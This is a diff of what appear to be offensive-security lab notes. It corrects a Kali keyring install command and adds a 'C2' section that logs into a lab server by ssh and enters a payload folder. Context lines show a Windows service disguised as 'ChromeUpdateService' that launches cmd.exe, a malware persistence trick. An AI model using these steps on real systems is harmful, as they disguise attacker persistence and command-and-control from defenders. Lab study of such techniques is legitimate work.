@@ -62,7 +62,7 @@ Get the keyring deb link from https://http.kali.org/kali/pool/main/k/kali-archiv
 
 ```
 wget https://http.kali.org/kali/pool/main/k/kali-archive-keyring/kali-archive-keyring_2020.2_all.deb
-sudo apt install .\kali-archive-keyring_2020.2_all.deb
+sudo apt install ./kali-archive-keyring_2020.2_all.deb
 ```
 
 <br/>
@@ -127,6 +127,12 @@ sc create ChromeUpdateService binpath= "cmd.exe /k C:\ProgramData\Chrome\ChromeU
 ---
 
 ## C2
+
+ssh -i lab.pem kali@13.251.130.48
+sudo su
+cd ~/payload
+
+
 
 Kali:
 
